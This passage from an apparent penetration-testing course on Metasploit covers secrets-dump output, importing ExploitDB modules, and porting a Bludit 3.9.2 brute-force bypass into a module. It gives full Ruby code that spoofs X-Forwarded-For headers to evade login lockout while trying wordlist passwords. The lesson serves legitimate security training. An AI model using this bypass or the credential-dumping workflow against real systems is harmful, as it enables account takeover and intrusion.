cur/hex :<span class="hljs-number"> 91 </span>de 7a b2 cb<span class="hljs-number"> 48 </span>86 4d cf a3 df ae bb 3d<span class="hljs-number"> 01 </span>40 ba<span class="hljs-number"> 37 </span>2e d9<span class="hljs-number"> 56 </span>d1 d7<span class="hljs-number"> 85 </span>cf<span class="hljs-number"> 08 </span>82<span class="hljs-number"> 93 </span>a2 ce 5f<span class="hljs-number"> 40 </span>66<span class="hljs-number"> 02 </span>02 e1 1a 9c 7f bf<span class="hljs-number"> 81 </span>91 f0 0f f2 af da ed ac 0a 1e<span class="hljs-number"> 45 </span>9e<span class="hljs-number"> 86 </span>9f e7 bd<span class="hljs-number"> 36 </span>eb b2 2a<span class="hljs-number"> 82 </span>83 2f 

Secret  : SAC

Secret  : SAI

Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}

Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}

Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService

Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService

Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService

Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService

Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService

Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService

Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService
</code></pre>
<p>From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.</p>
<h2 id="writing-and-importing-modules">Writing and Importing Modules</h2>
<hr>
<p>To install any new Metasploit modules which have already been ported over by other users, one can choose to update their <code>msfconsole</code> from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of <code>msfconsole</code>. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.</p>
<p>However, if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually. We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of <code>msfconsole</code> locally.</p>
<p><a href="https://www.exploit-db.com/">ExploitDB</a> is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is <a href="https://www.exploit-db.com/?tag=3">Metasploit Framework (MSF)</a>, which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the <code>msfconsole</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/39/exploit-db.png" alt=""></p>
<p>Let&#39;s say we want to use an exploit found for <code>Nagios3</code>, which will take advantage of a command injection vulnerability. The module we are looking for is <code>Nagios3 - &#39;statuswml.cgi&#39; Command Injection (Metasploit)</code>. So we fire up <code>msfconsole</code> and try to search for that specific exploit, but we cannot find it. This means that our Metasploit framework is not up to date or that the specific <code>Nagios3</code> exploit module we are looking for is not in the official updated release of the Metasploit Framework.</p>
<p><strong>MSF - Search for Exploits</strong></p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">msf6 &gt; search nagios

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   <span class="hljs-number">0</span>  exploit/linux/http/nagios_xi_authenticated_rce                <span class="hljs-number">2019</span><span class="hljs-number">-07</span><span class="hljs-number">-29</span>       excellent  Yes    Nagios XI Authenticated Remote Command Execution
   <span class="hljs-number">1</span>  exploit/linux/http/nagios_xi_chained_rce                      <span class="hljs-number">2016</span><span class="hljs-number">-03</span><span class="hljs-number">-06</span>       excellent  Yes    Nagios XI Chained Remote Code Execution
   <span class="hljs-number">2</span>  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  <span class="hljs-number">2018</span><span class="hljs-number">-04</span><span class="hljs-number">-17</span>       manual     Yes    Nagios XI Chained Remote Code Execution
   <span class="hljs-number">3</span>  exploit/linux/http/nagios_xi_magpie_debug                     <span class="hljs-number">2018</span><span class="hljs-number">-11</span><span class="hljs-number">-14</span>       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   <span class="hljs-number">4</span>  exploit/linux/misc/nagios_nrpe_arguments                      <span class="hljs-number">2013</span><span class="hljs-number">-02</span><span class="hljs-number">-21</span>       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
   <span class="hljs-number">5</span>  exploit/unix/webapp/nagios3_history_cgi                       <span class="hljs-number">2012</span><span class="hljs-number">-12</span><span class="hljs-number">-09</span>       great      Yes    Nagios3 history.cgi Host Command Execution
   <span class="hljs-number">6</span>  exploit/unix/webapp/nagios_graph_explorer                     <span class="hljs-number">2012</span><span class="hljs-number">-11</span><span class="hljs-number">-30</span>       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   <span class="hljs-number">7</span>  post/linux/gather/enum_nagios_xi                              <span class="hljs-number">2018</span><span class="hljs-number">-04</span><span class="hljs-number">-17</span>       normal     No     Nagios XI Enumeration
</code></pre>
<p>We can, however, find the exploit code <a href="https://www.exploit-db.com/exploits/9861">inside ExploitDB&#39;s entries</a>. Alternatively, if we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version, <code>searchsploit</code>.</p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ searchsploit nagios3

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - <span class="hljs-string">'history.cgi'</span> Host Command Execution (Metasploit)                                                                                  | linux<span class="hljs-regexp">/remote/</span><span class="hljs-number">24159.</span>rb
Nagios3 - <span class="hljs-string">'history.cgi'</span> Remote Command Execution                                                                                             | multiple<span class="hljs-regexp">/remote/</span><span class="hljs-number">24084.</span>py
Nagios3 - <span class="hljs-string">'statuswml.cgi'</span> <span class="hljs-string">'Ping'</span> Command Execution (Metasploit)                                                                              | cgi<span class="hljs-regexp">/webapps/</span><span class="hljs-number">16908.</span>rb
Nagios3 - <span class="hljs-string">'statuswml.cgi'</span> Command Injection (Metasploit)                                                                                     | unix<span class="hljs-regexp">/webapps/</span><span class="hljs-number">9861.</span>rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
<span class="hljs-string">Shellcodes:</span> No Results
</code></pre>
<p>Note that the hosted file terminations that end in <code>.rb</code> are Ruby scripts that most likely have been crafted specifically for use within <code>msfconsole</code>. We can also filter only by <code>.rb</code> file terminations to avoid output from scripts that cannot run within <code>msfconsole</code>. Note that not all <code>.rb</code> files are automatically converted to <code>msfconsole</code> modules. Some exploits are written in Ruby without having any Metasploit module-compatible code in them. We will look at one of these examples in the following sub-section.</p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ searchsploit -t Nagios3 --exclude=<span class="hljs-string">".py"</span>

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - <span class="hljs-string">'history.cgi'</span> Host Command Execution (Metasploit)                                                                                  | linux<span class="hljs-regexp">/remote/</span><span class="hljs-number">24159.</span>rb
Nagios3 - <span class="hljs-string">'statuswml.cgi'</span> <span class="hljs-string">'Ping'</span> Command Execution (Metasploit)                                                                              | cgi<span class="hljs-regexp">/webapps/</span><span class="hljs-number">16908.</span>rb
Nagios3 - <span class="hljs-string">'statuswml.cgi'</span> Command Injection (Metasploit)                                                                                     | unix<span class="hljs-regexp">/webapps/</span><span class="hljs-number">9861.</span>rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
<span class="hljs-string">Shellcodes:</span> No Results
</code></pre>
<p>We have to download the <code>.rb</code> file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and <code>msfconsole</code> proprietary files are stored is <code>/usr/share/metasploit-framework</code>. The critical folders are also symlinked in our home and root folders in the hidden <code>~/.msf4/</code> location.</p>
<p><strong>MSF - Directory Structure</strong></p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ ls /usr</span><span class="hljs-regexp">/share/metasploit</span>-framework/

app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  <span class="hljs-class"><span class="hljs-keyword">lib</span>                           <span class="hljs-title">msfconsole</span>  <span class="hljs-title">msf</span>-<span class="hljs-title">json</span>-<span class="hljs-title">rpc</span>.<span class="hljs-title">ru</span>  <span class="hljs-title">msfupdate</span>  <span class="hljs-title">plugins</span>    <span class="hljs-title">script</span>-<span class="hljs-title">exploit</span>   <span class="hljs-title">scripts</span></span>
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
</code></pre>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ ls .msf4/

history  <span class="hljs-keyword">local</span>  logos  logs  loot  modules  plugins  store
</code></pre>
<p>We copy it into the appropriate directory after downloading the <a href="https://www.exploit-db.com/exploits/9861">exploit</a>. Note that our home folder <code>.msf4</code> location might not have all the folder structure that the <code>/usr/share/metasploit-framework/</code> one might have. So, we will just need to <code>mkdir</code> the appropriate folders so that the structure is the same as the original folder so that <code>msfconsole</code> can find the new modules. After that, we will be proceeding with copying the <code>.rb</code> script directly into the primary location.</p>
<p>Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get <code>msfconsole</code> to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.</p>
<p>For example:</p>
<ul>
<li><code>nagios3_command_injection.rb</code></li>
<li><code>our_module_here.rb</code></li>
</ul>
<p><strong>MSF - Loading Additional Modules at Runtime</strong></p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cp ~/</span>Downloads<span class="hljs-regexp">/9861.rb /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/modules/</span>exploits<span class="hljs-regexp">/unix/</span>webapp/nagios3_command_injection.rb
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfconsole -m /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/modules/</span>
</code></pre>
<p><strong>MSF - Loading Additional Modules</strong></p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">msf6&gt; loadpath <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/m</span>odules<span class="hljs-regexp">/</span>
</code></pre>
<p>Alternatively, we can also launch <code>msfconsole</code> and run the <code>reload_all</code> command for the newly installed module to appear in the list. After the command is run and no errors are reported, try either the <code>search [name]</code> function inside <code>msfconsole</code> or directly with the <code>use [module-path]</code> to jump straight into the newly installed module.</p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">msf6 &gt; reload_all
msf6 &gt; <span class="hljs-keyword">use</span> exploit/unix/webapp/nagios3_command_injection 
msf6 exploit(unix/webapp/nagios3_command_injection) &gt; show options

Module options (exploit/unix/webapp/nagios3_command_injection):

   Name     Current Setting                 Required  Description
   <span class="hljs-comment">----     ---------------                 --------  -----------</span>
   PASS     guest                           yes       The password <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
   Proxies                                  no        A proxy chain <span class="hljs-keyword">of</span> format <span class="hljs-keyword">type</span>:host:<span class="hljs-keyword">port</span>[,<span class="hljs-keyword">type</span>:host:<span class="hljs-keyword">port</span>][...]
   RHOSTS                                   yes       The target host(s), <span class="hljs-keyword">range</span> CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-keyword">file</span> <span class="hljs-keyword">with</span> syntax <span class="hljs-symbol">'file</span>:&lt;path&gt;'
   RPORT    <span class="hljs-number">80</span>                              yes       The target <span class="hljs-keyword">port</span> (TCP)
   SSL      <span class="hljs-literal">false</span>                           no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path <span class="hljs-keyword">to</span> statuswml.cgi
   USER     guest                           yes       The username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
   VHOST                                    no        HTTP server virtual host


Exploit target:

   Id  Name
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   Automatic Target
</code></pre>
<p>Now we are ready to launch it against our target.</p>
<hr>
<h3 id="porting-over-scripts-into-metasploit-modules">Porting Over Scripts into Metasploit Modules</h3>
<p>To adapt a custom Python, PHP, or any type of exploit script to a Ruby module for Metasploit, we will need to learn the Ruby programming language. Note that Ruby modules for Metasploit are always written using hard tabs.</p>
<p>When starting with a port-over project, we do not need to start coding from scratch. Instead, we can take one of the existing exploit modules from the category our project fits in and repurpose it for our current port-over script. Keep in mind to always keep our custom modules organized so that we and other penetration testers can benefit from a clean, organized environment when searching for custom modules.</p>
<p>We start by picking some exploit code to port over to Metasploit. In this example, we will go for <a href="https://www.exploit-db.com/exploits/48746">Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass</a>. We will need to download the script, <code>48746.rb</code> and proceed to copy it into the <code>/usr/share/metasploit-framework/modules/exploits/linux/http/</code> folder. If we boot into <code>msfconsole</code> right now, we will only be able to find a single <code>Bludit CMS</code> exploit in the same folder as above, confirming that our exploit has not been ported over yet. It is good news that there is already a Bludit exploit in that folder because we will use it as boilerplate code for our new exploit.</p>
<p><strong>Porting MSF Modules</strong></p>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ls /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/modules/</span>exploits<span class="hljs-regexp">/linux/</span>http/ | grep bludit

bludit_upload_images_exec.rb
</code></pre>
<p>Writing and Importing Modules</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cp ~/</span>Downloads<span class="hljs-regexp">/48746.rb /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/modules/</span>exploits<span class="hljs-regexp">/linux/</span>http/bludit_auth_bruteforce_mitigation_bypass.rb
</code></pre>
<p>At the beginning of the file we copied, which is where we will be filling in our information, we can notice the <code>include</code> statements at the beginning of the boilerplate module. These are the mixins mentioned in the <code>Plugins and Mixins</code> section, and we will need to change these to the appropriate ones for our module.</p>
<p>If we want to find the appropriate mixins, classes, and methods required for our module to work, we will need to look up the different entries on the <a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">rubydoc rapid7 documentation</a>.</p>
<hr>
<h3 id="writing-our-module">Writing Our Module</h3>
<p>We will often face a custom-built network running proprietary code to serve its clients during specific assessments. Most of the modules we have at hand do not even make a dent in their perimeter, and we cannot seem to scan and document the target with anything we have correctly. This is where we might find it helpful to dust off our Ruby skills and start coding our modules.</p>
<p>All necessary information about Metasploit Ruby coding can be found on the <a href="https://www.rubydoc.info/github/rapid7/metasploit-framework">Rubydoc.info Metasploit Framework</a> related page. From scanners to other auxiliary tools, from custom-made exploits to ported ones, coding in Ruby for the Framework is an amazingly applicable skill.</p>
<p>Please look below at a similar module that we can use as boilerplate code for our exploit port-over. This is the <a href="https://www.exploit-db.com/exploits/47699">Bludit Directory Traversal Image File Upload Vulnerability</a> exploit, which has already been imported into <code>msfconsole</code>. Take a moment to acknowledge all the different fields included in the module before the exploit proof-of-concept (<code>POC</code>). Note that this code has not been changed in the snippet below to fit our current import but is a direct snapshot of the pre-existing module mentioned above. The information will need to be adjusted accordingly for the new port-over project.</p>
<p><strong>Proof-of-Concept - Requirements</strong></p>
<p>Code: ruby</p>
<pre><code class="lang-ruby">##
# This <span class="hljs-keyword">module</span> requires Metasploit: https:<span class="hljs-comment">//metasploit.com/download</span>
# Current source: https:<span class="hljs-comment">//github.com/rapid7/metasploit-framework</span>
##

<span class="hljs-keyword">class</span> MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report
</code></pre>
<p>We can look at the <code>include</code> statements to see what each one does. This can be done by cross-referencing them with the <a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">rubydoc rapid7 documentation</a>. Below are their respective functions as explained in the documentation:</p>
<table>
<thead>
<tr>
<th><strong>Function</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Msf::Exploit::Remote::HttpClient</code></td>
<td>This module provides methods for acting as an HTTP client when exploiting an HTTP server.</td>
</tr>
<tr>
<td><code>Msf::Exploit::PhpEXE</code></td>
<td>This is a method for generating a first-stage php payload.</td>
</tr>
<tr>
<td><code>Msf::Exploit::FileDropper</code></td>
<td>This method transfers files and handles file clean-up after a session with the target is established.</td>
</tr>
<tr>
<td><code>Msf::Auxiliary::Report</code></td>
<td>This module provides methods for reporting data to the MSF DB.</td>
</tr>
</tbody>
</table>
<p>Looking at their purposes above, we conclude that we will not need the FileDropper method, and we can drop it from the final module code.</p>
<p>We see that there are different sections dedicated to the <code>info</code> page of the module, the <code>options</code> section. We fill them in appropriately, offering the credit due to the individuals who discovered the exploit, the CVE information, and other relevant details.</p>
<p><strong>Proof-of-Concept - Module Information</strong></p>
<p>Code: ruby</p>
<pre><code class="lang-ruby">  def initialize(info={})
    <span class="hljs-keyword">super</span>(update_info(info,
      <span class="hljs-string">'Name'</span>           =&gt; <span class="hljs-string">"Bludit Directory Traversal Image File Upload Vulnerability"</span>,
      <span class="hljs-string">'Description'</span>    =&gt; %q{
        This module exploits a vulnerability <span class="hljs-keyword">in</span> Bludit. A remote user could abuse the uuid
        parameter <span class="hljs-keyword">in</span> the image upload feature <span class="hljs-keyword">in</span> order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to <span class="hljs-keyword">finally</span> <span class="hljs-keyword">get</span> remote code execution.
      },
      <span class="hljs-string">'License'</span>        =&gt; MSF_LICENSE,
      <span class="hljs-string">'Author'</span>         =&gt;
        [
          <span class="hljs-string">'christasa'</span>, # Original discovery
          <span class="hljs-string">'sinn3r'</span>     # Metasploit module
        ],
      <span class="hljs-string">'References'</span>     =&gt;
        [
          [<span class="hljs-string">'CVE'</span>, <span class="hljs-string">'2019-16113'</span>],
          [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://github.com/bludit/bludit/issues/1081'</span>],
          [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac'</span> ]
        ],
      <span class="hljs-string">'Platform'</span>       =&gt; <span class="hljs-string">'php'</span>,
      <span class="hljs-string">'Arch'</span>           =&gt; ARCH_PHP,
      <span class="hljs-string">'Notes'</span>          =&gt;
        {
          <span class="hljs-string">'SideEffects'</span> =&gt; [ IOC_IN_LOGS ],
          <span class="hljs-string">'Reliability'</span> =&gt; [ REPEATABLE_SESSION ],
          <span class="hljs-string">'Stability'</span>   =&gt; [ CRASH_SAFE ]
        },
      <span class="hljs-string">'Targets'</span>        =&gt;
        [
          [ <span class="hljs-string">'Bludit v3.9.2'</span>, {} ]
        ],
      <span class="hljs-string">'Privileged'</span>     =&gt; <span class="hljs-keyword">false</span>,
      <span class="hljs-string">'DisclosureDate'</span> =&gt; <span class="hljs-string">"2019-09-07"</span>,
      <span class="hljs-string">'DefaultTarget'</span>  =&gt; <span class="hljs-number">0</span>))
</code></pre>
<p>After the general identification information is filled in, we can move over to the <code>options</code> menu variables:</p>
<p><strong>Proof-of-Concept - Functions</strong></p>
<p>Code: ruby</p>
<pre><code class="lang-ruby"> register_options(
      [
        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-symbol">'TARGETURI</span>', [<span class="hljs-literal">true</span>, <span class="hljs-symbol">'The</span> base path <span class="hljs-keyword">for</span> Bludit', <span class="hljs-string">'/'</span>]),
        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-symbol">'BLUDITUSER</span>', [<span class="hljs-literal">true</span>, <span class="hljs-symbol">'The</span> username <span class="hljs-keyword">for</span> Bludit']),
        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-symbol">'BLUDITPASS</span>', [<span class="hljs-literal">true</span>, <span class="hljs-symbol">'The</span> password <span class="hljs-keyword">for</span> Bludit'])
      ])
  <span class="hljs-keyword">end</span>
</code></pre>
<p>Looking back at our exploit, we see that a wordlist will be required instead of the <code>BLUDITPASS</code> variable for the module to brute-force the passwords for the same username. It would look something like the following snippet:</p>
<p>Code: ruby</p>
<pre><code class="lang-ruby">OptPath.<span class="hljs-keyword">new</span>(<span class="hljs-string">'PASSWORDS'</span>, [ <span class="hljs-keyword">true</span>, <span class="hljs-string">'The list of passwords'</span>,
          <span class="hljs-keyword">File</span>.<span class="hljs-keyword">join</span>(Msf::Config.data_directory, <span class="hljs-string">"wordlists"</span>, <span class="hljs-string">"passwords.txt"</span>) ])
</code></pre>
<p>The rest of the exploit code needs to be adjusted according to the classes, methods, and variables used in the porting to the Metasploit Framework for the module to work in the end. The final version of the module would look like this:</p>
<p><strong>Proof-of-Concept</strong></p>
<p>Code: ruby</p>
<pre><code class="lang-ruby"><span class="hljs-comment">##</span>
<span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span>
<span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span>
<span class="hljs-comment">##</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Exploit::<span class="hljs-title">Remote</span></span>
  Rank = ExcellentRanking

  <span class="hljs-keyword">include</span> Msf::Exploit::Remote::HttpClient
  <span class="hljs-keyword">include</span> Msf::Exploit::PhpEXE
  <span class="hljs-keyword">include</span> Msf::Auxiliary::Report

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(info={})</span></span>
    <span class="hljs-keyword">super</span>(update_info(info,
      <span class="hljs-string">'Name'</span>           =&gt; <span class="hljs-string">"Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass"</span>,
      <span class="hljs-string">'Description'</span>    =&gt; <span class="hljs-string">%q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      }</span>,
      <span class="hljs-string">'License'</span>        =&gt; MSF_LICENSE,
      <span class="hljs-string">'Author'</span>         =&gt;
        [
          <span class="hljs-string">'rastating'</span>, <span class="hljs-comment"># Original discovery</span>
          <span class="hljs-string">'0ne-nine9'</span>  <span class="hljs-comment"># Metasploit module</span>
        ],
      <span class="hljs-string">'References'</span>     =&gt;
        [
          [<span class="hljs-string">'CVE'</span>, <span class="hljs-string">'2019-17240'</span>],
          [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'</span>],
          [<span class="hljs-string">'PATCH'</span>, <span class="hljs-string">'https://github.com/bludit/bludit/pull/1090'</span> ]
        ],
      <span class="hljs-string">'Platform'</span>       =&gt; <span class="hljs-string">'php'</span>,
      <span class="hljs-string">'Arch'</span>           =&gt; ARCH_PHP,
      <span class="hljs-string">'Notes'</span>          =&gt;
        {
          <span class="hljs-string">'SideEffects'</span> =&gt; [ IOC_IN_LOGS ],
          <span class="hljs-string">'Reliability'</span> =&gt; [ REPEATABLE_SESSION ],
          <span class="hljs-string">'Stability'</span>   =&gt; [ CRASH_SAFE ]
        },
      <span class="hljs-string">'Targets'</span>        =&gt;
        [
          [ <span class="hljs-string">'Bludit v3.9.2'</span>, {} ]
        ],
      <span class="hljs-string">'Privileged'</span>     =&gt; <span class="hljs-literal">false</span>,
      <span class="hljs-string">'DisclosureDate'</span> =&gt; <span class="hljs-string">"2019-10-05"</span>,
      <span class="hljs-string">'DefaultTarget'</span>  =&gt; <span class="hljs-number">0</span>))

     register_options(
      [
        OptString.new(<span class="hljs-string">'TARGETURI'</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">'The base path for Bludit'</span>, <span class="hljs-string">'/'</span>]),
        OptString.new(<span class="hljs-string">'BLUDITUSER'</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">'The username for Bludit'</span>]),
        OptPath.new(<span class="hljs-string">'PASSWORDS'</span>, [ <span class="hljs-literal">true</span>, <span class="hljs-string">'The list of passwords'</span>,
            File.join(Msf::Config.data_directory, <span class="hljs-string">"wordlists"</span>, <span class="hljs-string">"passwords.txt"</span>) ])
      ])
  <span class="hljs-keyword">end</span>

  <span class="hljs-comment"># -- Exploit code -- #</span>
  <span class="hljs-comment"># dirty workaround to remove this warning:</span>
<span class="hljs-comment">#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.</span>
<span class="hljs-comment"># see https://github.com/nahi/httpclient/issues/252</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebAgent</span></span>
  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cookie</span> &lt; HTTP::Cookie</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">domain</span></span>
      <span class="hljs-keyword">self</span>.original_domain
    <span class="hljs-keyword">end</span>
  <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_csrf</span><span class="hljs-params">(client, login_url)</span></span>
  res = client.get(login_url)
  csrf_token = <span class="hljs-regexp">/input.+?name="tokenCSRF".+?value="(.+?)"/</span>.match(res.body).captures[<span class="hljs-number">0</span>]
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">auth_ok?</span><span class="hljs-params">(res)</span></span>
  HTTP::Status.redirect?(res.code) &amp;&amp;
    <span class="hljs-regexp">%r{/admin/dashboard}</span>.match?(res.headers[<span class="hljs-string">'Location'</span>])
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bruteforce_auth</span><span class="hljs-params">(client, host, username, wordlist)</span></span>
  login_url = host + <span class="hljs-string">'/admin/login'</span>
  File.foreach(wordlist).with_index <span class="hljs-keyword">do</span> <span class="hljs-params">|password, i|</span>
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      <span class="hljs-string">'X-Forwarded-For'</span> =&gt; <span class="hljs-string">"<span class="hljs-subst">#{i}</span>-<span class="hljs-subst">#{password[..<span class="hljs-number">4</span>]}</span>"</span>,
    }
    data = {
      <span class="hljs-string">'tokenCSRF'</span> =&gt; csrf_token,
      <span class="hljs-string">'username'</span> =&gt; username,
      <span class="hljs-string">'password'</span> =&gt; password,
    }
    puts <span class="hljs-string">"[*] Trying password: <span class="hljs-subst">#{password}</span>"</span>
    auth_res = client.post(login_url, data, headers)
    <span class="hljs-keyword">if</span> auth_ok?(auth_res)
      puts <span class="hljs-string">"\n[+] Password found: <span class="hljs-subst">#{password}</span>"</span>
      <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">end</span>
  <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>

<span class="hljs-comment">#begin</span>
<span class="hljs-comment">#  args = Docopt.docopt(doc)</span>
<span class="hljs-comment">#  pp args if args['--debug']</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#  clnt = HTTPClient.new</span>
<span class="hljs-comment">#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])</span>
<span class="hljs-comment">#rescue Docopt::Exit =&gt; e</span>
<span class="hljs-comment">#  puts e.message</span>
<span class="hljs-comment">#end</span>
</code></pre>
<p>If you would like to learn more about porting scripts into the Metasploit Framework, check out the <a href="https://nostarch.com/metasploit">Metasploit: A Penetration Tester&#39;s Guide book from No Starch Press</a>. Rapid7 has also created blog posts on this topic, which can be found <a href="https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/">here</a>.</p>
<h2 id="introduction-to-msfvenom">Introduction to MSFVenom</h2>
<hr>
<p><code>MSFVenom</code> is the successor of <code>MSFPayload</code> and <code>MSFEncode</code>, two stand-alone scripts that used to work in conjunction with <code>msfconsole</code> to provide users with highly customizable and hard-to-detect payloads for their exploits.</p>
